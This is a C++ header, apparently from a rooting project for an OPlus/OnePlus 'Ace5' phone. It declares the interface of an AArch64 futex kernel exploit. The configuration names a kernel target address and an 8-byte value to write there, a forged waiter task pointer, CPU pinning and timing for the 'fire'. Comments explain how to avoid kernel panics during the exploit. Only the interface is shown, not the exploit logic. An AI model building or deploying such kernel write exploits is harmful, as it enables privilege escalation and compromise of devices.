// In-process AArch64 round API.
#ifndef ROOT_OPLUS_ACE5_FUTEX_PROBE_H
#define ROOT_OPLUS_ACE5_FUTEX_PROBE_H

#include <cstdint>
#include <string>

enum class GlWait { None, UidZero, PerfOpen };

struct GlRoundCfg {
    int      trace_fd = -1;     // append-only fd for pre-panic fire tracing
    int      trace_fd2 = -1;    // second copy, survives package wipe
    uint64_t target;            // absolute kernel address that receives `value`
    uint64_t value;             // 8 bytes stored at target
    uint64_t lock_addr;         // zero-lock slot (kernel address)
    uint64_t task_addr = 0;     // waiter->task paint; 0 -> AL_INIT_TASK.
                                // Must point at a task that is NEVER
                                // wakeable: the walk ends with
                                // wake_up_state(task, wake_state=3) and a
                                // match (sleeping task) triggers a full
                                // ttwu -- waking/migrating the idle task
                                // (init_task) panics the kernel. A pure
                                // user-mode spinner stays TASK_RUNNING so
                                // the match test fails instantly.
    int      fire_nice = 1;     // SCHED_NORMAL nice used by the one-shot fire
    int      waiter_cpu = 4;
    int      fire_cpu = 5;
    int      owner_cpu = 6;
    uint64_t fire_delay_ns = 0; // busy-wait after pselect return, before fire
    GlWait   wait = GlWait::None;
    int      wait_timeout_ms = 5000;
    void   (*on_success)(void *);
    void    *ctx = nullptr;
};

struct GlRoundOut {
    bool     bug_path = false;
    bool     observed = false;
    long     requeue_ret = 0;
    int      requeue_errno = 0;
    int      fires = 0;
    std::string note;
};

GlRoundOut gl_round(const GlRoundCfg &cfg);

#endif //ROOT_OPLUS_ACE5_FUTEX_PROBE_H
